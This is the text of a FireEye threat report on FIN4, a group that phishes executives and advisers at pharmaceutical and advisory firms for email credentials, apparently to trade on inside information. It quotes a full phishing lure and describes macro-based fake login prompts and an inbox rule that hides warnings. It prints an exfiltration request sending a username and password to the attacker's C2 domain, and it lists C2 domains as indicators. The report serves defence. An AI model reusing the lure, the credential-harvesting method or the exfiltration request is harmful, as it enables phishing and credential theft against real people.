FIN4 Likely Playing the MarketFireEye is currently tracking a group that \ntargets the email accounts of individuals \nprivy to the most confidential information of \nmore than 100 companies. The group, which we \ncall FIN4, appears to have a deep familiarity with \nbusiness deals and corporate communications, and \ntheir effects on financial markets. Operating since at \nleast mid-2013, FIN4 distinctly focuses on \ncompromising the accounts of individuals who \npossess non-public information about merger and \nacquisition (M&A) deals and major market-moving \nannouncements, particularly in the healthcare and \npharmaceutical industries. FIN4 has targeted \nindividuals such as top executives, legal counsel, \noutside consultants, and researchers, among others.   We are able to characterize FIN4’s activity from \nthe incidents to which we have responded in  \nour clients’ networks, FIN4’s attempts to \ncompromise our managed service clients, our \nproduct detection data, and further independent \nresearch. Our visibility into FIN4’s activities is \nlimited to their network operations; we can only \nsurmise how they may be using and potentially \nbenefiting from the valuable information they \nare able to obtain. However one fact remains \nclear: access to insider information that could \nmake or break stock prices for dozens of publicly \ntraded companies could surely put FIN4 at a \nconsiderable trading advantage. \nKEY FINDINGS\n100+\nTARGETS \nSince mid-2013, FIN4 \nhas targeted over 100 \norganizations, all of \nwhich are either publicly \ntraded companies or \nadvisory firms that \nprovide services such as \ninvestor relations, legal \ncounsel, and investment \nbanking. Approximately \ntwo-thirds of the \ntargeted organizations \nare healthcare and \npharmaceutical \ncompanies.  FIN4 knows their targets. \nTheir spearphishing \nthemes appear to be \nwritten by native \nEnglish speakers \nfamiliar with both \ninvestment terminology \nand the inner workings \nof public companies. FIN4 does not infect \ntheir victims with \nmalware, but instead \nfocuses on capturing \nusernames and \npasswords to victims’ \nemail accounts, allowing \nthem to view private \nemail correspondence.FIN4 uses their \nknowledge to craft \nconvincing phishing lures, \nmost often sent from \nother victims’ email \naccounts and through \nhijacked email threads. \nThese lures appeal to \ncommon investor and \nshareholder concerns, \nenticing the intended \nvictims into opening the \nweaponized document \nand entering their email \ncredentials. On multiple occasions, \nFIN4 has targeted \nseveral parties involved \nin a single business \ndeal, to include law \nfirms, consultants, and \nthe public companies \ninvolved in negotiations. \nThey also have \nmechanisms to organize \nthe data they collect \nand have taken steps to \nevade detection.\n4  fireeye.comHacking the Street? FIN4 Likely Playing the Market\nFigure 1:  FIN4’s T argets\nFireEye believes FIN4 intentionally targets \nindividuals who have inside information \nabout impending market catalysts—events \nthat will cause the price of stocks to rise or fall \nsubstantially in a short period of time. Since at \nleast mid-2013, FIN4 has pursued targets at \nmore than 100 organizations, over two-thirds of \nwhich are public healthcare and pharmaceutical \ncompanies. The remaining targets include \nadvisory firms that represent public companies  \nand a handful of public companies in other \nsectors closely followed by market watchers.   \nAll but three of the public companies are listed \non the NYSE or NASDAQ, with the remaining \nthree listed on non-US exchanges.APPL YING WALL STREET KNOW-HOW:  \nFIN4’S TARGETS\nIn order to get useful inside information, FIN4 \ncompromises the email accounts of individuals \nwho regularly communicate about market-\nmoving, non-public matters. \nFIN4 frequently targets:\n•\tC-level executives and senior leadership\n•\tLegal counsel\n•\tRegulatory, risk, and compliance personnel\n•\tResearchers\n•\tScientists\n•\tPeople in other advisory roles\nTARGETED \nORGANIZATIONS:   \nOVER 100 \nPUBLICL Y TRADED \nCOMPANIES AND \nADVISORY FIRMS\nFirms Advising \nPublic Companies \non Securities, Legal \nand M&A Matters  \n20%Other Publicly \nTraded Companies\n12%Publicly Traded \nHealthcare and \nPharmaceutical \nCompanies  \n68%5  fireeye.comHacking the Street? FIN4 Likely Playing the Market\nFigure 2:   \nT argeted healthcare and pharmaceutical  \nindustry sub-sectors\nM&A Deals in FIN4’s Crosshairs\nFIN4 focuses on acquiring information about \nongoing M&A discussions and identifying the \nindividuals who are most likely involved. The group \nfrequently employs M&A-themed and SEC-themed \nlures with Visual Basic for Applications (VBA) \nmacros implemented to steal the usernames and \npasswords of these key individuals.  Additionally, \nFIN4 has included links to fake Outlook Web App \n(OWA) login pages designed to capture the user’s \ncredentials. Once equipped with the credentials, \nFIN4 then has access to real-time email \ncommunications—and presumably insight into \npotential deals and their timing.\nMany of FIN4’s lures appeared to be stolen \ndocuments from actual deal discussions that the \ngroup then weaponized and sent to individuals \ndirectly involved in the deal. In some cases, the \ndiscussions were public knowledge and widely \nreported in the media, while others were still in the \nearly exploration and due diligence phases. In one \ninstance, we observed FIN4 simultaneously target \nfive different organizations involved in a single \nacquisition discussion. The group targeted \nindividuals at the five firms several months before \nthe organizations’ involvement in the acquisition \ntalks went public. Lasering in on Healthcare and \nPharmaceuticals \nWe believe FIN4 heavily targets healthcare and \npharmaceutical companies as stocks in these \nindustries can move dramatically in response to \nnews of clinical trial results, regulatory decisions, or \nsafety and legal issues.  In fact, many high-profile \ninsider trading cases involve the pharmaceutical \nsector. We’ve observed FIN4 access information \non a wide variety of issues—including drug \ndevelopment, insurance reimbursement rates, and \npending legal cases—all of which can significantly \ninfluence the price of healthcare industry stocks.  \nIn one case, FIN4 targeted employees involved in \nMedicaid rebates and government purchasing \nprocesses - these issues can heavily influence stock \nprices.  Healthcare and pharmaceutical companies \ndepend heavily on the decisions of large third party \npayers (like Medicaid) whose purchasing power and \nrebate decisions can make or break a company’s \nearnings.  FIN4 would presumably use this \ninformation to evaluate healthcare companies’ \nfuture revenue.50%12%\n10%13%2%\n5%\n5%3%FIN4 HEALTHCARE TARGETS:  \nOVER 60 PUBLIC COMPANIES \nIN VARIOUS SUB-INDUSTRIES\nBIOTECHNOLOGY  50%\nMEDICAL INSTRUMENTS & EQUIPMENT 12%\nMEDICAL DISTRIBUTION 2%\nMEDICAL DIAGNOSTICS & RESEARCH 5%\nMEDICAL DEVICES 13%\nHEALTHCARE PROVIDERS 3%\nHEALTHCARE PLANS 5%\nDRUG MANUFACTURERS 10%6  fireeye.com\nHacking the Street? FIN4 Likely Playing the MarketFigure 3:  Example of FIN4 Campaign CodeKeeping it Organized\nFIN4 organizes the targets of their activity with \nover 70 unique “campaign codes” to designate the \nemployer of the individuals they target, or in some \ncases the generic roles the targeted individuals play \nwithin that organization. \nFor example:  \n•\tCEO_CFO_COO_CORPDEV \n•\tSCIENTISTS_AND_RESEARCH \n•\t<PHARMACEUTICAL COMPANY NAME>\n•\t<ADVISORY FIRM NAME>These campaign codes function as labels that \nFIN4 uses to identify the origin of usernames  \nand passwords stolen from their targets.  These \ncampaign codes are transmitted to FIN4’s \ncommand and control (C2) servers along with \nstolen credentials. \nFIN4’s campaign codes illustrate their interest \nin the organizations and job roles most likely \nto have access to market-moving information \nbefore it goes public.7  fireeye.comHacking the Street? FIN4 Likely Playing the Market\nAfter identifying a target, FIN4 frequently \nembeds VBA macros into a previously \nstolen Office document. The embedded \nmacro displays a dialog box that mimics the \nWindows Authentication prompt for the user to \nenter their domain credentials. These credentials \nare transmitted to a server controlled by the group, \nallowing FIN4 to hijack that user’s email account. \nFIN4 also sends highly tailored emails that typically \nplay on the recipient’s knowledge or interest in a \npending deal. In several instances, FIN4 has \nincluded links to fake OWA login pages in their \nphishing emails instead (Figure 4). This would be \nuseful for targeting organizations that may have \ndisabled VBA macros in Microsoft Office.\nFIN4’s Social Engineering\nFIN4 knows their audience. Their spearphishing \nthemes appear to be written by native English \nspeakers familiar with both investment \nterminology and the inner workings of public \ncompanies. FIN4’s phishing emails frequently play \nup shareholder and public disclosure concerns.\nFigure 4 shows the group’s strong command of an \nexecutive’s concerns over illicit public disclosure, \nparticularly over executive incompetence and \ncompensation issues.  This email came from an \naccount that FIN4 hijacked at a public company \nand includes several watchwords: “disclosure” of \n“confidential company information regarding \npending transactions. ”  These specific issues are \nkey terms at public companies, where the public \ndisclosure of sensitive business information is \nstrictly regulated. Figure 4:  FIN4 phishing email to an executiveTAKING CARE OF BUSINESS:   \nFIN4’S TACTICS\nSubject:  employee making negative comments about you and the \ncompany\nFrom: <name>@<compromised company’s domain>\nI noticed that a user named FinanceBull82 (claiming to be an \nemployee) in an investment discussion forum posted some negative \ncomments about the company in general (executive compensation \nmainly) and you in specific (overpaid and incompetent). He gave \ndetailed instances of his disagreements, and in doing so, may have \nunwittingly divulged confidential company information regarding \npending transactions.\nI am a longtime client and I do not think that this will bode well \nfor future business. The post generated quite a few replies, most \nof them agreeing with the negative statements. While I understand \nthat the employee has the right to his opinion, perhaps he should \nhave vented his frustrations through the appropriate channels \nbefore making his post. The link to the post is located here (it \nis the second one in the thread):\nhttp://forum.< domain>/redirect.\nphp?url=http://<domain>%2fforum%2fequities%2f375823902%2farticle.\nphp\\par\n \nCould you please talk to him?\n \nThank you for the assistance, \n<name>8  fireeye.com\nHacking the Street? FIN4 Likely Playing the MarketWhile a large share of FIN4’s lures are previously \nstolen confidential company documents, the group \noccasionally uses generic lures of interest to the \ninvestment community (Figure 5).\nFIN4 also uses existing email threads in a victim’s \ninbox to spread their weaponized documents. We’ve \nseen the actors seamlessly inject themselves into \nemail threads. FIN4’s emails would be incredibly \ndifficult to distinguish from a legitimate email sent \nfrom a previously compromised victim’s email \naccount. The actors have also Bcc’d all recipients, \nmaking it even more difficult for recipients to \ndecipher a malicious email from a legitimate one.A Fly on Many Walls\nIn several of our investigations, FIN4 targeted \nmultiple parties involved in a business deal, \nincluding law firms, consultants, and public \ncompanies. In one instance, FIN4 appeared to \nleverage its previously-acquired access to email \naccounts at an advisory firm (“Advisory Firm A”) to \ncollect data during a potential acquisition of one of \nAdvisory Firm A’s clients (“Public Company A”). \nFIN4 proceeded to send a spearphishing email \nfrom a compromised account at Advisory Firm A to \nanother advisory firm (“Advisory Firm B”), who was \nalso representing Public Company A. FIN4 used a \nSEC filing document as a lure. After news of the \npossible acquisition was made public, Public \nCompany A’s stock price varied significantly. It is \nlikely that FIN4 used the inside information they \nhad to capitalize on these stock fluctuations. \nFigure 5:  Generic FIN4 Lure Document9  fireeye.com\nHacking the Street?

FIN4 sends a second \nspearphishing email to \nthe M&A team at \nPublic Company A , as \nwell as to several of \nthe M&A team’s \nadvisors at outside \nfirms.  Public Company A  \nannounces its plans \nregarding a possible \nM&A deal with Public \nCompany B .

FIN4 Likely Playing the MarketFigure 6:  Outlook rule to filter emails\nEvading Detection\nFIN4 has been observed creating a rule in victims’ \nMicrosoft Outlook accounts that automatically \ndeletes any emails that contain words such as \n“hacked” , “phish” , “malware” , etc. (Figure 6). The \ngroup likely implements these rules to prevent \ncompromised victims from receiving replies from \nintended targets that their email account may be \ncompromised, and likely buys FIN4 extra time \nbefore victim organizations detect their activities.Conclusion\nIf FIN4’s activities are indeed part of a sustained \neffort to gain advance access to market-moving \ninformation, it would not be the first time that \nnetwork intrusions have played a role in an insider \ntrading case. However the scale of FIN4’s \noperations, with targets at more than 100 public \ncompanies, coupled with their tactic of going after \nkey individuals’ emails, sets this group apart.\nOur visibility into FIN4 is limited to their network \noperations, so we cannot say for certain what \nhappens after they gain access to insider \ninformation.  What we can say is that FIN4’s \nnetwork activities must reap enough benefit to \nmake these operations worth supporting for over a \nyear—and in fact, FIN4 continues to compromise \nnew victims as we finish this report.  \n \n11  fireeye.com\nHacking the Street? FIN4 Likely Playing the MarketAPPENDIX: \nTACTICS \nFIN4 employs a simple, yet effective, method to \ngather targets’ user credentials through their \nspearphishing emails. Using VBA macros, they \nembed malicious code into already existing and \nlegitimate company documents.  Embedded in \neach Microsoft Word or Excel document is a \nmalicious macro that prompts the user for their \nOutlook credentials. We have also observed this \ngroup send emails with links to fake Outlook Web \nApp (OWA) login pages that will also steal the \nuser’s credentials, however we have not observed \nthis tactic in recent months.\nFigure 7:  Example of  \n“Module1” used in  \none of the most  \nrecent campaigns\nVBA Macros Embedded into \nLegitimate Documents\nThe embedded VBA macro consists of a module \ntypically entitled “Module1” and a user form that \nhas been called both “UserForm1” and \n“UserLoginForm” . The code in Module1 contains \nthe information needed to communicate with the \nC2 server (Figure 7). 12  fireeye.com\nHacking the Street? FIN4 Likely Playing the MarketThe userform contains the code for the user \ncredentials prompt and an artifact that is highly \nindicative of the actors’ targeting. The artifact (a \ncampaign code) is usually tailored to the particular \ntarget company or the company from which they \nare targeting others; alternately, the artifact may \nrepresent a generic role for targeted individuals, \nsuch as SCIENTISTS_AND_RESEARCH or \nCEO_CFO_COO_CORPDEV. We have identified \nover 70 unique campaign codes to date. This \ncampaign code is transmitted to the C2 server along with the victim’s username and password, as \nseen in Figure 8.  \nMany of the fake Outlook windows opened by the \nmacros contain the logo of the company targeted \ngiving the pop-up apparent legitimacy. Figure 9 \nbelow represents a generic pop-up, with no \ncompany-specific information that a user might \nsee after opening the document. Only after \ncredentials are entered will the document appear \nfor the user.\nFigure 9:  Malicious Dialogue that Prompts for User’s CredentialsFigure 8:  Example of “UserForm1” with Campaign Code\n13  fireeye.com\nHacking the Street? FIN4 Likely Playing the MarketFigure 10:  POST Request Containing User’s Credentials Sent to C2\nNetworking and Infrastructure\nAfter the user enters data into the username and \npassword fields, the data is transmitted to the C2 \nserver via a POST request (Figure 10). FIN4 then \nuses the collected credentials to login to victim \nemail accounts.  In addition to gaining access to the \nvictim’s private communications, FIN4 also uses \nthe compromised accounts to email malicious \ndocuments to additional targets inside and outside \nthe victim company. The group is currently active \nas this report goes to publication and recently  \nused the domains junomaat81[.]us and \nlifehealthsanfrancisco2015[.]com as their C2s.FIN4 appears to be heavily reliant on T or (software \nthat enables users to browse the Internet \nanonymously by encrypting their internet traffic \nand routing it through servers around the world) \nand has been seen using T or to login to victims’ \nemail accounts after obtaining the compromised \nuser credentials.  We have detected at least two \nUser Agents that the actors have used and which \ncan be used to identify potentially suspicious OWA \nactivity in network logs, when paired with \noriginating T or IP addresses.POST /report.php?msg=FAKE_PHARMA&uname=john.doe&pword=abc123 HTTP/1.1\nConnection: Keep-Alive\nContent-Type: text/plain; Charset=UTF-8\nAccept: */*\nAccept-Language: en-us\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1;\nTrident/6.0)\nContent-Length: 0\nHost: www.junomaat81.us\nMozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0\nMozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0\nFigure 11:  FIN4 User Agents14  fireeye.com\nHacking the Street? FIN4 Likely Playing the MarketWe have identified nine C2 domains that we \nbelieve were registered by the actors to conduct \nthese operations. There are also legitimate \ndomains that appear to have been compromised \nand used in previous campaigns in late 2013 and \nearly 2014; however in the recent months we \nhave not seen indications that the actor has used \ncompromised legitimate domains to conduct \ntheir operations. \nWhat Can Network Defenders Do?\nThe relative simplicity of FIN4’s tactics \n(spearphishing, theft of valid credentials, lack  \nof any malware installed on victim machines)  \nmakes their intrusion activity difficult to detect. \nHowever a few basic security measures can help T able 1:  List of known Actor-Registered C2 Domains\nActor-Registered C2 Domains\nellismikepage[.]info lifehealthsanfrancisco2015[.]com\nrpgallerynow[.]info dmforever[.]biz\nmsoutexchange[.]us junomaat81[.]us\noutlookscansafe[.]net nickgoodsite.co[.]uk\noutlookexchange[.]net\nthwart the group’s efforts. Disabling VBA macros \nin Microsoft Office by default, as well as blocking \nthe domains listed in T able 1 will help protect \nagainst FIN4’s current activities. Additionally, \nenabling two-factor authentication for OWA and \nany other remote access mechanisms can help \nprevent credentials stolen in this manner from \nbeing leveraged successfully. Companies can also \ncheck their network logs for OWA logins from \nknown T or exit nodes if they suspect they are \nvictimized.  Typically, legitimate users do not use \nT or for accessing email. While not conclusive, if \npaired with known targeting by this group, the \naccess from T or exit nodes can serve as an \nindicator of the group’s illicit logins.15  fireeye.com\nHacking the Street?
